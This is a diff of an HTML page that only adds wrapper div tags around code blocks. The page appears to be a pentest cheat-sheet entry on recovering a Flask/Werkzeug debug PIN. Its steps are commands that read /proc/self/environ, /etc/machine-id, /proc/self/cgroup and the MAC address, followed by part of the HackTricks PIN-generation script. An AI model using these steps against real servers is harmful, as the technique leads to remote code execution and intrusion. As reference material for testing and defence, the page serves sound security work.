@@ -199,18 +199,27 @@
 <div class="content"><hr>
 <h3 id="retrieve-flask-debug-pin">Retrieve Flask Debug Pin</h3>
 <h4 id="1-get-user">1. Get user</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /proc/self/environ <span class="p">|</span> grep -aE <span class="o">(</span><span class="s1">&#39;USER&#39;</span><span class="p">|</span><span class="s1">&#39;LOGNAME&#39;</span><span class="o">)</span>
-</span></span></code></pre></div><h4 id="2-get-full-path-of-the-application">2. Get full path of the application</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-get-full-path-of-the-application">2. Get full path of the application</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+------------------------------+
 </span></span><span class="line"><span class="cl">| Get from Traceback debug log |
 </span></span><span class="line"><span class="cl">+------------------------------+
-</span></span></code></pre></div><h4 id="3-get-mac-address">3. Get MAC address</h4>
+</span></span></code></pre></div></div>
+<h4 id="3-get-mac-address">3. Get MAC address</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /sys/class/net/eth0/address
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Convert to int</span>
 </span></span><span class="line"><span class="cl">python3 -c <span class="s2">&#34;print(int(&#39;&lt;MAC_ADDRESS&gt;&#39;.replace(&#39;:&#39;,&#39;&#39;), 16))&#34;</span>
-</span></span></code></pre></div><h4 id="4-create-machine-id-string">4. Create Machine ID String</h4>
+</span></span></code></pre></div></div>
+<h4 id="4-create-machine-id-string">4. Create Machine ID String</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="k">$(</span>cat /etc/machine-id<span class="k">)$(</span>head -n <span class="m">1</span> /proc/self/cgroup <span class="p">|</span> rev <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> rev<span class="k">)</span>
-</span></span></code></pre></div><h4 id="5-update-public-and-private-bits-in-hacktricks-script">5. Update public and private bits in Hacktrick&rsquo;s Script</h4>
+</span></span></code></pre></div></div>
+<h4 id="5-update-public-and-private-bits-in-hacktricks-script">5. Update public and private bits in Hacktrick&rsquo;s Script</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
@@ -256,7 +265,8 @@
 </span></span><span class="line"><span class="cl">        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
